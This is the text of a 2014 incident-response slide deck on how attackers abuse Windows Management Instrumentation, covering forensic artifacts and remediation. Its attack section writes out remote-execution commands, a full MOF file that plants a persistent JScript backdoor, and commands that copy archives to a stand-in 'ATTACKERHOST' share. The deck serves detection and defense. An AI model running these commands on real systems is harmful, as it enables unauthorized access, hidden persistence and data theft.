There's Something About WMI
Christopher Glyer, Devon Kerr October 7, 2014
BACKGROUND
2

Overview
 2014 ­ started seeing multiple threat groups adopt WMI  Used "The Google" and found little mainstream forensic
info on WMI for persistence  Only mainstream reference http://www.trendmicro.com/cloud-content/us/pdfs/securityintelligence/white-papers/wp__understanding-wmimalware.pdf
3
Windows Management Instrumentation (WMI)
 What is WMI? - Framework for managing Windows systems - Structure resembles XML
 Appears informally organized
- Limited technical documentation - Primary endpoint components include:
 Collection of managed resource definitions (objects.data)  Physical or logical objects that can be managed by WMI
 Binary Tree Index (index.btr)  List of files imported into objects.data
4

WMI Continued
 Default on all OS' >= Windows 2000  Powerful, but need admin privileges to execute  Directly accessible using "wmic.exe" (CLI)  Has a SQL-like query language (WQL)  Allows remote management using
- VBScript - JavaScript - PowerShell
5
WMI Continued
 Example command to remotely list processes:
wmic.exe /node:[SYSTEM] /user:[USERNAME] /password:[PASSWORD] process get name,processid
 Primary classes for management functionality stored in a namespace called Root\\Cimv2 - CIMv2 classes include
 Hardware  Installed applications  Operating System  Performance and monitoring  WMI management
6

Managed Object Files (MOF)
 What if we want to add/extend the functionality of WMI? - Solution: MOFs
 MOF files can be used to implement new WMI classes  Define new properties or create methods for interaction
 Portable  Compiled on the system with "mofcomp.exe"  Support autorecovery via the "pragma autorecover" feature
 "mofcomp.exe ­autorecover my.mof"  Alternatively include "#pragma autorecover" in MOF file
7
Example MOF Autorecover
#PRAGMA AUTORECOVER #pragma classflags ("updateonly", "forceupdate") #pragma namespace("\\\\.\\root\\subscription") instance of __EventFilter as $EventFilter {
EventNamespace = "Root\\Cimv2"; Name = "_SM.EventFilter"; Query = "Select * From __InstanceModificationEvent Where TargetInstance Isa \"Win32_LocalTime\" And TargetInstance.Second=5"; QueryLanguage = "WQL"; };
Note: Pre-Vista, any MOF file in "%Systemroot%\wbem\mof\" would be automatically compiled and imported into the CIM repository
8

INTERACTING WITH WMI
9
Several Ways of Interacting with WMI
 WMIC ­ command line interface  WinRM ­ command line interface for Windows Remote
Management  WMI-Shell - http://www.lexsi.com/Windows-Management-
Instrumentation-Shell.html  Open Asset Logger-
http://sourceforge.net/projects/openassetlogger/  PowerShell ­ built-in scripting framework
10

WMIC
 Interface to WMI  Introduced aliases which map simple commands to more
complicated WMI queries  Requires administrator privilege to use
11
WinRM
 Command line interface to Windows Remote Management  Supports querying remote systems  Can invoke WMI via "GET" operator  Example use to query attributes of "spooler" service on
remote system:
winrm get wmicimv2/Win32_Service?Name=spooler ­r:<remote system>
12

WMI-Shell
 Developed by Lexsi  Allows WMI commands to be run from Linux on remote
Windows systems  Only uses port 135  Was ported to Windows as "Create-WMIshell" (Github) by
secabstraction
13
Open Asset Logger
 Developed by John Thomas  Executes pre-built WMI queries  Useful solely for reconnaissance  Can query single machine or domain
14

PowerShell
 Most powerful way to interact with WMI  Allows for a multitude of result formatting options  Powershell scripts are portable  Only requires the source system to have Powershell
available when interacting with WMI remotely
15
MALICIOUS USE CASES
16

Ways Attackers Use WMI
 Reconnaissance  Lateral movement  Privilege escalation  Establishing a foothold  Persistence  Data theft
17
Reconnaissance
 List patches installed on the local workstation with WMIC
wmic qfe get description,installedOn /format:csv
 List information on running processes with WMIC
wmic process get caption,executablepath,commandline
 List user accounts with WMIC
wmic useraccount get /ALL
18

Reconnaissance Continued
 Identify whether a host is a SQL server with WMI
wmic /node:"192.168.0.1" service where (caption like "%sql server (%")
 List network shares on a remote system using powershell and WMI
get-wmiobject ­class "win32_share" ­namespace "root\CIMV2" ­ computer "targetname"
19
Lateral Movement
 With WMI (note that this technique is applicable to multiple stages of the attack lifecycle)
wmic /node:REMOTECOMPUTERNAME PROCESS call create "COMMAND AND ARGUMENTS"
20

Privilege Escalation (Process Impersonation)
 With VBscript
If args.Length = 0 Then Usage()
Else If strComputer = "." Then Set objWMIService =
GetObject("winmgmts:{impersonationLevel=Impersonate}!\\.\root\cimv2") Else Set objSWbemLocator = CreateObject("WbemScripting.SWbemLocator") Set objWMIService = objSWbemLocator.ConnectServer(strComputer, _ "root\CIMV2", _ strUser, _ strPassword, _ "MS_409", _ "ntlmdomain:" + strDomain) End If
 Process impersonation helps in cases where the WMI provider doesn't have rights to behave as desired
21
Establishing a Foothold
 Execute commands on a remote system with WMI
wmic /NODE: "192.168.0.1" process call create "evil.exe"
22

Persistence
 WMI persistence requires three components: - An event filter ­ the condition you're waiting for
 _EventFilter objects have a name and condition
- An event consumer ­ the persistent payload
 _EventConsumer objects have a name and a script, path to script, or path to executable
 SYSTEM context pre-Vista  LOCAL SERVICE context on Vista and later
- A binding between the filter and consumer
 _FilterToConsumerBinding objects reference an event filter and event consumer
23
Most Useful Standard Filters
 _EventFilter classes include
 Win32_LocalTime ­ a time condition like once a minute  Win32_Directory ­ the presence of a file or directory  Win32_Service ­ whenever a service starts or stops  ....many more Operating System Classes
24

Example Event Filters
 Example using Win32_LocalTime:
$instanceFilter=([wmiclass]"\\.\root\subscription:_EventFi lter"_).CreateInstance() $instanceFilter.QueryLanguage = "WQL" $instanceFilter.Query = "SELECT * FROM __InstanceModificationEvent Where TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Second=5" $instanceFilter.Name="SneakyFilter" $instanceFilter.EventNameSpace = `root\Cimv2
Will run once per minute when the seconds hand is at "05"
25
Most Useful Standard Consumers
 ActiveScriptEventConsumer - Uses Windows Script Host (WSH) - Runs scripts including:
 JScript  VBScript
 CommandLineEventConsumer - Executes a command and arguments
 Such as "powershell.exe mypayload.ps1"
26

Example ActionScriptEventConsumer
 Example using externally referenced JScript file, "sneak.js"
$instanceConsumer = ([wmiclass]"\\.\root\subscription:ActionScriptEventConsume r").CreateInstance() $instanceConsumer.Name = "SneakyConsumer" $instanceConsumer.ScriptingEngine = "JScript" $instanceConsumer.ScriptFileName = "C:\users\dkerr\appdata\temp\sneak.js"
27
Example CommandLineEventConsumer
 Example event consumer using command line "c:\temp\sneak.exe /e /V /L"
Instance CommandLineEventConsumer as $CMDLINECONSUMER { Name = "Sneaky Consumer"; CommandLineTemplate = "c:\\Temp\\sneak.exe /e /V /L"; RunInteractively = False; WorkingDirectory = "c:\\"; }
28

Create a Binding from Consumer to Filter
 Bind the Filter to the Consumer for persistence
instance of __FilterToConsumerBinding {
Consumer = $Consumer; Filter = $EventFilter; };
Note that $Consumer and $EventFilter have been previously defined as "SneakyConsumer" and "SneakyFilter"
29
"Let's Put it All Together" - in a MOF File
line 1 "C:\\windows\\temp\\sneak.mof" #PRAGMA AUTORECOVER #pragma classflags ("updateonly", "forceupdate") #pragma namespace("\\\\.\\root\\subscription") instance of __EventFilter as $EventFilter {
EventNamespace = "Root\\Cimv2"; Name = "_SM.EventFilter"; Query = "Select * From __InstanceModificationEvent Where TargetInstance Isa \"Win32_LocalTime\" And TargetInstance.Second=5"; QueryLanguage = "WQL"; }; instance of ActiveScriptEventConsumer as $Consumer { Name = "_SM.ConsumerScripts"; ScriptingEngine = "JScript"; ScriptText = "oFS = new ActiveXObject('Scripting.FileSystemObject');JF='C:/Windows/Addins/%Mutex%';oMutexFile = null;try{oMutexFile = oFS.OpenTextFile(JF, 2, true);}catch(e){}"
"CoreCode = `INSERT BASE64 ENCODED SCRIPT HERE' ';" "if(oMutexFile){oMutexFile.Write(unescape(CoreCode));oMutexFile.Close();(new ActiveXObject('WScript.Shell')).Run('cscript /E:JScript '+JF, 0);}"; }; instance of __FilterToConsumerBinding { Consumer = $Consumer; Filter = $EventFilter; };
30

Malicious Persistence Using WMI
Command line example of compiling MOF file:
Contents of malicious WMI script:
Output from Autoruns tool depicting malicious EventConsumer:
31
Data Theft
 Using WMI process create
wmic /NODE: "192.168.0.1" /user:"Domain\Administrator" /password:"1234" process call create "xcopy "D:\\everything.rar" "\\ATTACKERHOST\\C$\\e.dat""
 Using WMI and powershell
(Get-WmiObject -Class CIM_DataFile -Filter 'Name="D:\\everything.rar"' -ComputerName MYSERVER -Credential 'MYSERVER\Administrator').Rename("\\\\ATTACKERHOST\\C$\\everyth ing.rar")
32

FORENSIC ARTIFACTS
33
Obligatory Reference to "Taken"
34

MEMORY ARTIFACTS
35
Potential Forensic Artifacts ­ Process memory
 Fragments of WMI commands may be found within process memory - Wmiprvse.exe - Svchost.exe process associated with WinMgMt service - Csrss.exe or conhost.exe (XP/2003 or Vista and above)
 Reliable evidence of the following activities is weak after any elapsed period of time: - Reconnaissance - Lateral movement - Privilege escalation (process impersonation)
36

Potential Forensic Artifacts ­ Process memory
37
FILE SYSTEM ARTIFACTS
38

Potential Forensic Artifacts - MOF Files
 Malicious MOF files may still be present on disk - Ex: "C:\Windows\Addins\evil.mof" - Don't assume these files will be present
 MOF files may be created in the autorecovery directory: - "C:\Windows\System32\wbem\autorecover\[RAND].mof"
 References to MOF files may be found in the binary tree index: - "C:\Windows\System32\wbem\Repository\index.btr"
F.Mof with No path
39
Potential Forensic Artifacts - CIM Repository
 New WMI classes stored in the WMI repository - File location:
 "C:\WINDOWS\System32\wbem\repository\fs\objects.data"
- Search for the strings
 EventConsumer  EventFilter  FilterToConsumerBinding  Wscript.shell  Wscript.sleep  On Error Resume Next
- Look for large base64 encoded blocks of text which may correspond to malicious scripts
40

Potential Forensic Artifacts - Objects.data
JScript base64-encoded within Objects.data as ActiveScriptEventConsumer
41
Potential Forensic Artifacts - Prefetch
 Prefetch files may capture useful command references: - Windows Scripting Host (WSH)
 C:\Windows\Prefetch\CSCRIPT.EXE-E4C98DEB.pf  C:\Windows\Prefetch\WSCRIPT.EXE-65A9658F.pf
- WMI Standard Event Consumer
 C:\Windows\Prefetch\SCRCONS.EXE-D45CB92D.pf
- MOF compiler
 C:\Windows\Prefetch\MOFCOMP.EXE-CDA1E783.pf
42

REGISTRY ARTIFACTS
43
Potential Forensic Artifacts - Registry
 Binaries executed on remote systems may be recorded in the AppCompatCache registry key - Without context this may appear to be legitimate activity - The following binaries may be relevant
 Cscript.exe  Wscript.exe  Wmic.exe  Powershell.exe  Scrcons.exe  Mofcomp.exe
44

Potential Forensic Artifacts - Registry
 The list of autorecover MOF files is stored in this registry key: - "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WBEM\CI MOM\autorecover mofs"
 Registering a WMI Event Filter which uses "Win32_LocalTime" causes the following empty registry key to be created - "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WBEM\ES S\//./root/CIMV2\Win32ClockProvider"
45
WMI TRACE LOGS
46

WMI Trace Logs
Scenario: Attacker interacts with target host through WMI
 What is default level of WMI logging? None.
47
WMI Trace Logs
 Command to configure WMI trace logs
 "wevtutil.exe sl Microsoft-Windows-WMI-Activity/Trace /e:true"  May generate a significant amount of log activity
 If configured, which WMI trace logs capture activity?
- WMI-Activity Windows event log - Pre-Vista, WMI Service logs stored in
"%SYSTEMROOT%\wbem\logs\"  wbemcore.log  mofcomp.log  wbemprox.log
48

WMI-Activity Windows Event Log Example
 Trace log capturing the reconnaissance command: "wmic.exe /node:"192.168.1.1" service get pathname"
49
WMI-Activity Windows Event Log Example
 Trace log capturing command execution: "wmic.exe process call create `netstat ­ano'"
 Note that the name of the executable is not captured - Process memory, appcompat, and prefetch may provide more context
50

WMI Service Logs
 What is in each log source? - wbemcore.log
 Logon activity and authentication failures (required setting: verbose)
- mofcomp.log
 Successful and failed MOF compile operations including the name and path of MOF files, whether it was imported, and failures (required setting: verbose)
- wbemprox.log
 Login failures based on incorrect credentials, service availability, or permissions issues (required setting: errors or verbose)
51
WMI Service Log Examples
 wbemcore.log
(Mon Dec 09 11:13:59 2010.231145) : DCOM connection from DOMAIN\Username at authentication level Packet, AuthSvc = 9, AuthzSvc = 1, Capabilities = 0
 mofcomp.log
(Sat Aug 01 11:13:21 2013.1675625) : Parsing MOF file C:\evil.mof
 wbemprox.log (hex codes need to be looked up)
(Tue Oct 01 17:01:07 2011.4653221) : NTLMLogin resulted in hr = 0x80041017
52

CASE STUDY
53
Case Study #1: Using WMI for Reconnaissance
 CSRSS memory analysis - Query remote user attributes:
wmic.exe /node:"10.2.13.41" /user:"ABCAdmin" /password:"superman" useraccount get AccountType,Description,Domain,Disabled,LocalAccount,SID
- List remote services:
wmic.exe /node:"10.2.13.41" /user:"ABCAdmin" /password:"superman" service get Name,Caption,State,ServiceType,pathname
54

Case Study #2: Persistent Backdoor Using WMI
 Observed callback to malicious C2
 Queried WMI for _EventFilter, _EventConsumer, and _FilterToConsumerBinding attributes
 Malicious JScript configured to run every minute using Win32_LocalTime class

55

Case Study #2: Persistent Backdoor Using WMI

 The following registry key was modified on 06/04/14:

Key

Value Data

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WBEM\ [N/A] ESS\//./root/CIMV2\Win32ClockProvider

[N/A]

Key Last Modified

06/04/14 01:30:03 UTC

56

Case Study #3: Data Theft with WMI and Powershell
 Pagefile.sys analysis identified:
(Get-WmiObject -Class CIM_DataFile -Filter 'Name="F:\\Path\To\Secret\Sauce\20130102.rar"' -ComputerName DOMAINCONTROLLER1 -Credential `DOMAINCONTROLLER1\Administrator').Rename("\\\\WIN2K8AD01\\ADMIN$ \\01.dat")
57
REMEDIATION
58

Remediating Persistent WMI Infections
Scenario: So you have a system infected with a persistent WMI script
Now what?
59
Remediation
60

How to Remove Persistent WMI Backdoors
 Using Powershell execute the following commands: - Step 1: Identify WMI EventFilter
get-wmiobject -namespace root\subscription -query "select * from __EventFilter"
- Step 2: Identify WMI EventConsumer
get-wmiobject -namespace root\subscription -query "select * from __EventConsumer"
- Step 3: Identify Binding of WMI Filter to Consumer
get-wmiobject -namespace root\subscription -query "select * from __FilterToConsumerBinding"
61
How to Remove Persistent WMI Backdoors
 Step 4: Remove malicious Consumer Binding
gwmi ­Namespace "root\subscription" ­class _FilterToConsumerBinding | Remove-WMIObject ­WhatIf
 Step 5: Remove malicious Event Filter
gwmi -Namespace "root/subscription" -Class __EventFilter | where name -eq "sneakyfilter" | Remove-WmiObject ­WhatIf
 Step 6: Remove malicious Event Consumer
gwmi -Namespace "root/subscription" -Class LogFileEventConsumer | where name -EQ "sneakyconsumer" | Remove-WmiObject -WhatIf
62

CONCLUSIONS
63
Lessons Learned
 Targeted threat actors are increasingly relying on WMI  WMI can be leveraged for nearly every phase of the
compromise  WMI persistence easily defeats traditional AV, whitelisting,
and can be overlooked when conducting forensic analysis  Process memory may contain artifacts of WMI activity
64

Acknowledgements
 Bob Wilton  Ryan Kazanciyan  Matt Hastings  Matt Graeber
65
Questions?
christopher.glyer@mandiant.com @cglyer
devon.kerr@mandiant.com @dk_mandiant
66

